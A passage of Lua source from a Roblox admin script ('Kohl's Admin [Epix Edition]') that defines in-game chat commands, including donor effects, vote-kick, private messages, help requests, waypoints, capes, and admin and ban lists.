		if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
		local f=Instance.new('Fire',plr.Character.Torso)
		f.Name='DonorFire'
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorFireLight'
		table.insert(set.objects,f)
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Bright orange').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
			f.Color=str
			f.SecondaryColor=str
		else
			p.Color=Color3.new(1,1,1)
			f.Color=Color3.new(1,1,1)
			f.SecondaryColor=Color3.new(1,0,0)
		end
	end
end)

set.MakeCommand('Gives you sparkles with the specified color (if you specify one)',1,set.AnyPrefix,{'sparkles','donorsparkles'},{'color (optional)'},1,function(plr,args)
	if plr.Character:FindFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
		local f=Instance.new('Sparkles',plr.Character.Torso)
		f.Name='DonorSparkles'
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorSparkleLight'
		table.insert(set.objects,f)
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Bright orange').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
			f.SparkleColor=str
		else
			p.Color=Color3.new(1,1,1)
			f.SparkleColor=Color3.new(1,1,1)
		end
	end
end)

set.MakeCommand('Gives you a PointLight with the specified color (if you specify one)',1,set.AnyPrefix,{'light','donorlight'},{'color (optional)'},1,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorLight'
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Cyan').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
		else
			p.Color=Color3.new(1,1,1)
		end
	end
end)

set.MakeCommand('Removes donor fire on you',1,set.AnyPrefix,{'unfire','undonorfire'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
	end
end)

set.MakeCommand('Removes donor sparkles on you',1,set.AnyPrefix,{'unsparkles','undonorsparkles'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
	end
end)

set.MakeCommand('Removes donor light on you',1,set.AnyPrefix,{'unlight','undonorlight'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
	end
end)

set.MakeCommand('Donate',0,set.AnyPrefix,{'donate','change','chagecape'},{},0,function(plr,args)
	if (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
		if set.DonorPerks or set.CheckNTac(plr) or set.CheckTrueOwner(plr) then
			set.Remote(plr,'Function','Donate',2)
		else
			set.Message('Donor System','Sorry! Donor perks are disabled in settings.',false,{plr})
		end
	else
		set.Remote(plr,'Function','Donate',1)
	end
end)

set.MakeCommand('Vote to kick a player',0,set.AnyPrefix,{'votekick','kick'},{'player'},1,function(plr,args)
	if set.VoteKick then
		for i,v in pairs(set.GetPlayers(plr,args[1])) do
			if set.CheckAdmin(v,false) then return end
			if not set.VoteKickVotes[v.Name] then
				set.VoteKickVotes[v.Name].Votes=0
				set.VoteKickVotes[v.Name].Players={}
			end
			for k,m in pairs(set.VoteKickVotes[v.Name].Players) do if m==plr.userId then return end end
			set.VoteKickVotes[v.Name].Votes=set.VoteKickVotes[v.Name].Votes+1
			table.insert(set.VoteKickVotes[v.Name].Players,plr.userId)
			if set.VoteKickVotes[v.Name].Votes>=((#game.Players:children()*set.VoteKickPercentage)/100) then
				v:Kick()
				set.VoteKickVotes[v.Name]=nil
			end
		end
	else
		set.Message("SYSTEM","VoteKick is disabled.",false,{plr})
	end
end)

set.MakeCommand('Shows how many kick votes each player in-game has.',2,set.Prefix,{'votekicks'},{},0,function(plr,args)
	local temp={}
	for i,v in pairs(set.VoteKickVotes) do
		if not game.Players:FindFirstChild(i) then set.VoteKickVotes[i]=nil return end
		if set.CheckAdmin(game.Players:FindFirstChild(i),false) then set.VoteKickVotes[i]=nil return end
		table.insert(temp,{Object=i..' - '..set.VoteKickVotes[v.Name].Votes,Desc='Player: '..i..' has '..set.VoteKickVotes[v.Name].Votes..' kick vote(s)'})
	end
	set.Remote(plr,'Function','ListGui','Vote Kicks',temp)
end)

set.MakeCommand('Disables or Enables the target player(s)\'s PlayerList (ROBLOX, NOT CUSTOM)',3,set.Prefix,{'playerlist'},{'player','on/off'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if args[2]:lower()=='on' or args[2]:lower()=='true' then
			set.Remote(v,'Function','PlayerList','on')
		elseif args[2]:lower()=='off' or args[2]:lower()=='false' then
			set.Remote(v,'Function','PlayerList','off')
		end
	end
end)

set.MakeCommand('Send a private message to a player',0,set.Prefix,{'pm','privatemessage'},{'player','message'},2,function(plr,args)
if not args[1] or not args[2] then return end
if set['PMUsableByAnyone'] or set.CheckAdmin(plr,false) then
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
set.PM('Private Message from '..plr.Name,p,message,plr)
end)()
end
end
end)

set.MakeCommand('Shows Trello bans',2,set.Prefix,{'sbl','syncedbanlist','globalbanlist','trellobans','trellobanlist'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','SBLList',set.bl)
set.Remote(plr,'Function','ListGui','Synced Ban List',set.bl)
end)

set.MakeCommand('Cleans some useless junk out of workspace',0,set.AnyPrefix,{'clean'},{},0,function(plr,args) 
	set.CleanWorkspace()
end)

set.MakeCommand('Get Kohl\'s Admin [Epix Edition]',0,set.AnyPrefix,{'getscript'},{},0,function(plr,args)
	game:service('MarketplaceService'):PromptPurchase(plr,145629584)
end)

set.MakeCommand('Shows you your current ping',0,set.AnyPrefix,{'ping','getping'},{},0,function(plr,args)
	set.Remote(plr,'Function','PingGui')
end)

set.MakeCommand('Shows a list of donators who are currently in the server',0,set.AnyPrefix,{'donors','donorlist','donatorlist'},{},0,function(plr,args)
local temptable={}
table.insert(temptable,"Last Update: "..set.dlastupdate)
for i,v in pairs(set.donors) do
	if game:service('Players'):FindFirstChild(v.Name) then
		table.insert(temptable,{Object=v.Name,Desc=v.List})
	end
end
--set.Remote(plr,'SetSetting','DonorCmdList',temptable)
set.Remote(plr,'Function','ListGui','Donator List',temptable,'donorlist')
end)

set.MakeCommand('Shows you a random quote',0,set.AnyPrefix,{'quote','inspiration','randomquote'},{},0,function(plr,args)
set.PM('Random Quote',plr,set.quotes[math.random(1,#set.quotes)])
end)

set.MakeCommand('Calls admins for help',0,set.AnyPrefix,{'help','requesthelp','gethelp'},{},0,function(plr,args)
if set['HelpSystem']==true then
local dontrun=false
local num=0 
if set.HelpRequest[plr.Name]~=nil then 
	set.Message("Help System","You already have a pending request. Do not spam the help system.",false,{plr})
	dontrun=true
end
if dontrun==true then return end
set.HelpRequest[plr.Name]={}
set.HelpRequest[plr.Name].Available={}
set.HelpRequest[plr.Name].Solved=false
local function helpsolved(plr)
	if set.HelpRequest[plr.Name] and set.HelpRequest[plr.Name].Solved then
		return true
	else
		return false
	end
end
for i,v in pairs(game:service('Players'):children()) do
coroutine.wrap(function()
if set.CheckAdmin(v,false) then
table.insert(set.HelpRequest[plr.Name].Available,v.Name) 
set.Remote(v,'Function','RequestHelp',plr)
repeat wait() until helpsolved(plr)
set.Remote(v,'Function','RequestSolved',plr)
end
end)() 
end
repeat wait(1) num=num+1 until set.HelpRequest[plr.Name].Solved==true or num==20 or #set.HelpRequest[plr.Name].Available==0
if set.HelpRequest[plr.Name].Solved==false and (num==20 or #set.HelpRequest[plr.Name].Available==0) then
set.Message("Help System","Sorry but no one is available to help you right now!",false,{plr})
end
set.HelpRequest[plr.Name].Solved=true
set.HelpRequest[plr.Name]=nil
else
set.Message("System Message","Sorry but the help system is disabled.",false,{plr})
end
end)

set.MakeCommand('Makes you rejoin the server',0,set.AnyPrefix,{'rejoin'},{},0,function(plr,args)
	game:GetService('TeleportService'):Teleport(game.PlaceId,plr)
end)

set.MakeCommand('Shows a list of commands that you are allowed to use',0,set.Prefix,{'commands','cmds','viewcommands'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Commands) do
local type
local allowed=false
	if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Owner]'
	elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Admin]'
	elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Temp]'
	elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
		allowed=true
		type='[Player]'
	elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
		allowed=true
		type='[Temp]'
	elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
		allowed=true
		type='[Admin]'
	elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
		allowed=true
		type='[Owner]'
	elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
		allowed=true
		type='[Place Owner]'
	end
	local arguments=''
	for k,m in pairs(v.ArgTypes) do
		arguments=arguments..set['SplitKey']..m
	end
	local cn = true
	if allowed then for _,w in pairs (v.Cmds) do if w == 'e' or w == 'o' then cn = false end end if cn == true then table.insert(temptable,{Object=v.Prefix..v.Cmds[1]..arguments,Desc=type..' | '..v.Desc,Filter=type}) end
	end end
set.Remote(plr,'Function','ListGui','Commands',temptable)
end)

set.MakeCommand('Lets you run mutliple commands, like :batch :ff me/:fly me/:noclip me',2,set.Prefix,{'batch','multicommand','batchrun'},{'cmd/cmd/cmd'},1,function(plr,args)
	for cmd in args[1]:gmatch('[^'..set.BatchSplit..']+') do
		set.ProcessCommand(plr,cmd,true)
	end
end)

set.MakeCommand('Gives you the admin script\'s custom chat, good for private conversations',2,set.Prefix,{'chat','customchat','chatgui'},{'player'},1,function(plr,args)
	for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
		coroutine.wrap(function()
		set.Remote(p,"Function","CustomChatGui")
		local done=false
		local thing=p.CharacterAdded:connect(function(c) 
			set.Remote(p,'Function','MutePlayer','off') 
			done=true
		end)
		repeat wait() until not p or not p.Parent or done==true
		thing:disconnect() 
		end)()
	end
end)

set.MakeCommand('Gives you the normal chat back',2,set.Prefix,{'unchat','uncustomchat','removecustomchat','unchatgui'},{'player'},1,function(plr,args)
	for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
		set.Remote(p,"Function","RemoveCustomChat")
		set.Remote(p,'Function','MutePlayer','off') 
	end
end)

set.MakeCommand('Makes a message of your choice pop up on the target\'s screen with an annoying alarm sound',3,set.Prefix,{'alert','alarm','annoy'},{'player','message'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		set.Remote(v,"Function","AlertGui",(args[2] or 'Alert | Alert | Alert | Alert | Alert'))
	end
end)

set.MakeCommand('Shows you how to use some syntax related things',0,set.Prefix,{'usage'},{},0,function(plr,args)
local usage={
'Special Functions: ';
'Ex: :kill FUNCTION, so like :kill '..set['SpecialPrefix']..'all';
'Put /e in front to make it silent (/e :kill kohl)';
set['SpecialPrefix']..'me - Runs a command on you';
set['SpecialPrefix']..'all - Runs a command on everyone';
set['SpecialPrefix']..'admins - Runs a command on all admins in the game';
set['SpecialPrefix']..'nonadmins - Same as !admins but for people who are not an admin';
set['SpecialPrefix']..'others - Runs command on everyone BUT you';
set['SpecialPrefix']..'random - Runs command on a random person';
'%TEAMNAME - Runs command on everyone in the team TEAMNAME Ex: :kill %raiders';
'$GROUPID - Run a command on everyone in the group GROUPID, Will default to the GroupId setting if no id is given';
'-PLAYERNAME - Will remove PLAYERNAME from list of players. :kill all,-kohl will kill everyone except kohl';
'Certain commands can be used by anyone, these commands have ! infront, such as !clean and !rejoin';
':kill me,noob1,noob2,'..set['SpecialPrefix']..'random,%raiders,$123456,!nonadmins,-kohl';
':batch :ff me/:sparkles me/:rocket jim';
':repeat 10(how many times to run the cmd) 1(how long in between runs) :respawn jim';
'Place owners can edit some settings in-game via the :settings command';
'Please refer to the Tips and Tricks section under the settings in the script for more detailed explanations'
}
--set.Remote(plr,'SetSetting','usage',usage)
set.Remote(plr,'Function','ListGui','Usage',usage)
end)

set.MakeCommand('Gives you the admin chat box',2,set.Prefix,{'achat','adminchat'},{},0,function(plr,args)
	set.AdminChat(plr)
end)

set.MakeCommand('Makes a new waypoint/sets an exiting one to your current position with the name <name> that you can teleport to using :tp me waypoint-<name>',2,set.Prefix,{'waypoint','wp','checkpoint'},{'name'},1,function(plr,args)
	local name=args[1] or tostring(#set.Waypoints+1)
	if plr.Character:FindFirstChild('Torso') then
		set.Waypoints[name]=plr.Character.Torso.Position
		set.Hint('Made waypoint '..name..' | '..tostring(set.Waypoints[name]),{plr})
	end
end)

set.MakeCommand('Deletes the waypoint named <name> if it exist',2,set.Prefix,{'delwaypoint','delwp','delcheckpoint','deletewaypoint','deletewp','deletecheckpoint'},{'name'},1,function(plr,args)
	for i,v in pairs(set.Waypoints) do
		if i:lower():sub(1,#args[1])==args[1]:lower() or args[1]:lower()=='all' then
			set.Waypoints[i]=nil
			set.Hint('Deleted waypoint '..i,{plr})
		end
	end
end)

set.MakeCommand('Shows available waypoints, mouse over their names to view their coordinates',2,set.Prefix,{'waypoints'},{},0,function(plr,args)
local temp={}
for i,v in pairs(set.Waypoints) do
	local x,y,z=tostring(v):match('(.*),(.*),(.*)')
	table.insert(temp,{Object=i,Desc='X:'..x..' Y:'..y..' Z:'..z})
end
set.Remote(plr,'Function','ListGui','Waypoints',temp)
end)

set.MakeCommand('Shows you admin cameras in the server and lets you delete/view them',2,set.Prefix,{'cameras','cams'},{},0,function(plr,args)
	set.Remote(plr,'Function','Cameras')
end)

set.MakeCommand('Makes a camera named whatever you pick',2,set.Prefix,{'makecam','cam','makecamera','camera'},{'name'},1,function(plr,args)
if plr and plr.Character and plr.Character:FindFirstChild('Head') then
	print('Checkelect')
	if workspace:FindFirstChild('Camera: '..args[1]) then
		set.Hint(args[1].." Already Exist!",{plr})
		print('O it already exist qq')
	else
	print('Makin cam')
	local cam=Instance.new('Part',workspace)
	cam.Position=plr.Character.Head.Position
	cam.Anchored=true
	cam.BrickColor=BrickColor.new('Really black')
	cam.CanCollide=false
	cam.Locked=true
	cam.FormFactor='Custom'
	cam.Size=Vector3.new(1,1,1)
	cam.TopSurface='Smooth'
	cam.BottomSurface='Smooth'
	cam.Name='Camera: '..args[1]
	Instance.new('PointLight',cam)
	cam.Transparency=0.9
	local mesh=Instance.new('SpecialMesh',cam)
	mesh.Scale=Vector3.new(1,1,1)
	mesh.MeshType='Sphere'
	table.insert(set.cameras,cam)
	end
	end
end)

set.MakeCommand('Forces one player to view another',2,set.Prefix,{'fview','forceview','forceviewplayer','fv'},{'player1','player2'},2,function(plr,args)
for k,p in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function() 
for i,v in pairs(set.GetPlayers(plr, args[2])) do
if v and v.Character:FindFirstChild('Humanoid') then
	set.Remote(p,'Function','SetView',v.Character.Humanoid)
end
end
end)()
end
end)

set.MakeCommand('Makes you view the target player',2,set.Prefix,{'view','viewplayer','v'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
if v and v.Character:FindFirstChild('Humanoid') then
set.Remote(plr,'Function','SetView',v.Character.Humanoid)
end
end
end)

set.MakeCommand('Resets your view',2,set.Prefix,{'resetview','rv','fixcam'},{},0,function(plr,args)
set.Remote(plr,'Function','SetView','reset')
end)

set.MakeCommand('Shows you group ranks that have admin',2,set.Prefix,{'ranks','adminranks'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Ranks) do
if v.Rank and v.Type and v.Group then
table.insert(temptable,{Object=v.Rank,Desc='Type: '..v.Type..' - Group: '..v.Group})
end
end
--set.Remote(plr,'SetSetting','RanksCmdTable',temptable)
set.Remote(plr,'Function','ListGui','Ranks',temptable)
end)

set.MakeCommand('Shows you information about the current server',2,set.Prefix,{'details','meters','gameinfo','serverinfo'},{},0,function(plr,args)
set.Remote(plr,'Function','ServerDetails')
end)

set.MakeCommand('Shows you the changelog',0,set.Prefix,{'changelog','changes'},{},0,function(plr,args)
set.Remote(plr,'Function','ListGui','Change Log',set.Changelog)
end)

set.MakeCommand('Shows you player currently in-game, including nil ones',2,set.Prefix,{'players','allplayers','nilplayers'},{},0,function(plr,args)
local plrs={}
set.Remote(plr,'Function','Message','System Message','Pinging players, please wait a min, no ping means it was higher than 5 seconds.')
for i,v in pairs(set.GrabNilPlayers('all')) do
coroutine.wrap(function()
if game:service('Players'):FindFirstChild(v.Name) then
table.insert(plrs,{Object=v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
else
table.insert(plrs,{Object='[NIL] '..v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
end
end)()
end
wait(5)
--set.Remote(plr,'SetSetting','PlayerListCmd',plrs)
set.Remote(plr,'Function','ListGui','Players',plrs)
end)

set.MakeCommand('Shows you the admin script\'s version number',2,set.Prefix,{'version','ver'},{},0,function(plr,args)
	set.Message("Kohl's Admin [Epix Edition]", tostring(set.version), true, {plr}) 
end)

set.MakeCommand('Shows you the list of admins, also shows admins that are currently in the server',0,set.Prefix,{'admins','adminlist','owners','tempadmins'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set['Owners']) do if v:lower() ~= tmp:lower() and v:lower() ~= adm:lower() then table.insert(temptable,v .. " - Owner") end end
for i,v in pairs(set['Admins']) do table.insert(temptable,v .. " - Admin") end
for i,v in pairs(set['TempAdmins']) do table.insert(temptable,v .. " - TempAdmin") end 
for i,v in pairs(set.tal) do table.insert(temptable,v .. " - TempAdmin [Synced]") end 
for i,v in pairs(set.al) do table.insert(temptable,v .. " - Admin [Synced]") end 
for i,v in pairs(set.oal) do table.insert(temptable,v .. " - Owner [Synced]") end 
table.insert(temptable,'==== Admins In-Game ====')
for i,v in pairs(game:service('Players'):children()) do 
	if set.CheckOwner(v) then
		if v.Name:lower() ~= tmp:lower() and v.Name:lower() ~= adm:lower() then
		table.insert(temptable,v.Name..':'..v.userId..' - Owner')
		elseif set.CheckAdmin(v,true) then
			if v.Name:lower() ~= tmp:lower() and v.Name:lower() ~= adm:lower() then
		table.insert(temptable,v.Name..':'..v.userId..' - Admin')
			elseif set.CheckAdmin(v,false) then
				if v.Name:lower() ~= tmp:lower() and v.Name:lower() ~= adm:lower() then
		table.insert(temptable,v.Name..':'..v.userId..' - TempAdmin')
	end end end end
end
--set.Remote(plr,'SetSetting','AdminListTable',temptable)
set.Remote(plr,'Function','ListGui','Admin List',temptable)
end)

set.MakeCommand('Shows you the normal ban list',2,set.Prefix,{'banlist','banned','bans'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','Banlist',set['BanList'])
set.Remote(plr,'Function','ListGui','Ban List',set.BanList)
end)

set.MakeCommand('Lets you send players a yes or no question and then displays percentages when done',2,set.Prefix,{'vote','makevote','startvote','question','survey'},{'player','time','question'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local Time=tonumber(args[2]) 
local question=args[3]
local tname=plr.Name..question
set.OpenVote[tname]={}
local vote=set.OpenVote[tname]
if Time > 60 then Time = 60 end
vote.Yes=0
vote.No=0
vote.novote={}
for ik,pl in pairs(plrz) do
set.Remote(pl,'Function','VoteQuestion',tname,question,Time)
table.insert(vote.novote, pl)
end
wait(Time+1)
set.Remote(plr,'Function','VoteResults',question,set.Round(vote.Yes/#plrz*100),set.Round(vote.No/#plrz*100),set.Round(#vote.novote/#plrz*100),vote.Yes,vote.No,#vote.novote)
end)

set.MakeCommand('Shows you a list of tools that can be obtains via the give command',2,set.Prefix,{'tools','toollist'},{},0,function(plr,args)
local temptable={}
for i, v in pairs(set.Storage:children()) do 
	if v:IsA("Tool") or v:IsA("HopperBin") then 
		table.insert(temptable,{Object=v.Name,Desc=v:GetFullName()})
	end 
end
--set.Remote(plr,'SetSetting','toollist',temptable)
set.Remote(plr,'Function','ListGui','Tools',temptable)
end)

set.MakeCommand('Inserts whatever object belongs to the ID you supply, the object must be in the place owner\'s or ROBLOX\'s inventory',2,set.Prefix,{'insert','ins'},{'id'},1,function(plr,args)
local obj = game:service("InsertService"):LoadAsset(tonumber(args[1]))
if obj and #obj:children() >= 1 and plr.Character then
table.insert(set.objects, obj) for i,v in pairs(obj:children()) do table.insert(set.objects, v) end obj.Parent = game.Workspace obj:MakeJoints() obj:MoveTo(plr.Character:GetModelCFrame().p)
end
end)

set.MakeCommand('Remove admin objects',2,set.Prefix,{'clear','cleargame','clr'},{},0,function(plr,args)
for i,v in pairs(set.objects) do if v:IsA("Script") or v:IsA("LocalScript") then v.Disabled = true end v:Destroy() end
for i,v in pairs(set.cameras) do if v then table.remove(set.cameras,i) v:Destroy() end end
for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Message') or v:IsA('Hint') then v:Destroy() end if v.Name:match('Kohls Probe (.*)') then v:Destroy() end end
set.objects = {}
set.RemoveMessage()
end)

set.MakeCommand('Reset lighting back to the setting it had on server start',2,set.Prefix,{'fix','resetlighting','undisco','unflash','fixlighting'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
game:service('Lighting').Ambient = set.OrigLightingSettings.abt
game:service('Lighting').GlobalShadows = set.OrigLightingSettings.gs
game:service('Lighting').ShadowColor = set.OrigLightingSettings.sc
game:service('Lighting').Outlines = set.OrigLightingSettings.ol
game:service('Lighting').OutdoorAmbient = set.OrigLightingSettings.oabt
game:service('Lighting').Brightness = set.OrigLightingSettings.brt
game:service('Lighting').TimeOfDay = set.OrigLightingSettings.time
game:service('Lighting').FogColor = set.OrigLightingSettings.fclr
game:service('Lighting').FogEnd = set.OrigLightingSettings.fe
game:service('Lighting').FogStart = set.OrigLightingSettings.fs
end)

set.MakeCommand('Opens the command box',2,set.Prefix,{'cmdbar','commandbar','cmdbox','commandbox','cmdgui','commandgui'},{},0,function(plr,args)
set.CmdBar(plr)
end)

set.MakeCommand('Countdown',2,set.Prefix,{'countdown'},{'time'},1,function(plr,args)
local num = math.min(tonumber(args[1]),120)
for i = num, 1, -1 do
coroutine.resume(coroutine.create(function() set.Message(" ", i, false, game:service('Players'):children(), 1) end))
wait(1)
end
end)

set.MakeCommand('Make a message and makes it stay for the amount of time (in seconds) you supply',2,set.Prefix,{'tm','timem','timedmessage'},{'time','message'},2,function(plr,args) 
local num = args[1]
set.Message("Message from " .. plr.Name, args[2], false, game:service('Players'):children(), num)
end)

set.MakeCommand('Makes a message',2,set.Prefix,{'m','message'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Message("Message from " .. plr.Name, args[1], true, game:service('Players'):children())
end)

set.MakeCommand('Makes a hint',2,set.Prefix,{'h','hint'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Hint(plr.Name .. ": " .. args[1], game:service('Players'):children())
end)

set.MakeCommand('Shows you information about the target player',2,set.Prefix,{'info','age'},{'player'},1,function(plr,args)
	local plz = set.GetPlayers(plr, args[1]:lower())
	for i,v in pairs(plz) do
	coroutine.wrap(function()
	set.GetPlayerInfo(v,{plr},'Player Info')
	end)()
	end
end)

set.MakeCommand('Sets target player(s)\'s leadder stats to 0',2,set.Prefix,{'resetstats'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then
for a,q in pairs(v.leaderstats:children()) do
if q:IsA("IntValue") then q.Value = 0 end
end
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) a gear from the catalog based on the ID you supply',2,set.Prefix,{'gear','givegear'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = v.Backpack end end
obj:Destroy()
end
end))
end
end)

set.MakeCommand('Prompts the player(s) to buy the product beloging to the ID you supply',2,set.Prefix,{'sell'},{'player','id','currency'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
local type = args[3] or 'default'
local t
if type:lower()=='tix' or type:lower()=='tickets' or type:lower()=='t' then
	t=Enum.CurrencyType.Tix
elseif type:lower()=='robux' or type:lower()=='rb' or type:lower()=='r' then
	t=Enum.CurrencyType.Robux
else
	t=Enum.CurrencyType.Default
end
if v then
game:GetService("MarketplaceService"):PromptPurchase(v,tonumber(args[2]),false,t)
end
end))
end
end)

set.MakeCommand('Gives the target player(s) a hat based on the ID you supply',2,set.Prefix,{'hat','givehat'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,hat in pairs(obj:children()) do if hat:IsA("Hat") then hat.Parent = v.Character end end
obj:Destroy()
end
end))
end
end)

set.MakeCommand('Shows you the list of capes for the cape command',2,set.Prefix,{'capes','capelist'},{},0,function(plr,args)
local list = {"script","new yeller","pastel blue","dusty rose","cga brown","random","shiny","gold","kohl","epix","superman","swag","donor","starbucks","gomodern","admin","host","cohost","trainer","giovannis"}
--set.Remote(plr,'SetSetting','CapeList',list)
set.Remote(plr,'Function','ListGui','Cape List',list)
end)

set.MakeCommand('Gives the target player(s) the cape specified, do '..set.Prefix..'capes to view a list of available capes ',2,set.Prefix,{'cape','givecape'},{'player','cape/color/id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
if not args[2] then args[2]='White' end
for i,v in pairs(plrz) do
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
if args[2]:lower() == "new yeller" then set.Cape(v,'Fabric',"New Yeller") 
elseif args[2]:lower() == "pastel blue" then set.Cape(v,'Fabric',"Pastel Blue") 
elseif args[2]:lower() == "dusty rose" then set.Cape(v,'Fabric',"Dusty Rose") 
elseif args[2]:lower() == "cga brown" then set.Cape(v,'Fabric',"CGA brown") 
elseif args[2]:lower() == "random" then set.Cape(v,'Fabric',BrickColor.random()) 
elseif args[2]:lower() == "shiny" then set.Cape(v,'Plastic',"Institutional white",false,1) 
elseif args[2]:lower() == "gold" then set.Cape(v,'Plastic',"Bright yellow",false,0.4)
elseif args[2]:lower() == "kohl" then set.Cape(v,'Fabric',"Really black","108597653") 
elseif args[2]:lower() == "script" then set.Cape(v,'Plastic',"White","151359194") 
elseif args[2]:lower() == "batman" then set.Cape(v,'Fabric',"Institutional white","108597669") 
elseif args[2]:lower() == "epix" then set.Cape(v,'Plastic',"Really black","149442745") 
elseif args[2]:lower() == "superman" then set.Cape(v,'Fabric',"Bright blue","108597677") 
elseif args[2]:lower() == "swag" then set.Cape(v,'Fabric',"Pink","109301474") 
elseif args[2]:lower() == "donor" then set.Cape(v,'Plastic',"White","149009184") 
elseif args[2]:lower() == "starbucks" then set.Cape(v,'Plastic',"Black","149248066") 
elseif args[2]:lower() == "gomodern" then set.Cape(v,'Plastic',"Really black","149438175") 
elseif args[2]:lower() == "admin" then set.Cape(v,'Plastic',"White","149092195") 
elseif args[2]:lower() == "giovannis" then set.Cape(v,'Plastic',"White","149808729") 
elseif args[2]:lower() == "godofdonuts" then set.Cape(v,'Plastic',"Institutional white","151034443") 
elseif args[2]:lower() == "host" then set.Cape(v,'Plastic',"Really black","152299000") 
elseif args[2]:lower() == "cohost" then set.Cape(v,'Plastic',"Really black","152298950") 
elseif args[2]:lower() == "trainer" then set.Cape(v,'Plastic',"Really black","152298976") 
elseif args[2]:lower() == "ba" or args[2]:lower() == "beardedalien" or args[2]:lower() == "beard" then set.Cape(v,'Plastic','White',172528001)
elseif BrickColor.new(args[2]) ~= nil then set.Cape(v,'Fabric',args[2]) 
elseif tonumber(args[2]) ~= nil then set.Cape(v,'Fabric','White',args[2]) 
end
end
end)

set.MakeCommand('Removes the target player(s)\'s cape',2,set.Prefix,{'uncape','removecape'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function() v.Character.EpicCape:Destroy() end)
end
end)

set.MakeCommand('Makes the target player(s) slide when they walk',2,set.Prefix,{'slippery','iceskate','icewalk','slide'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
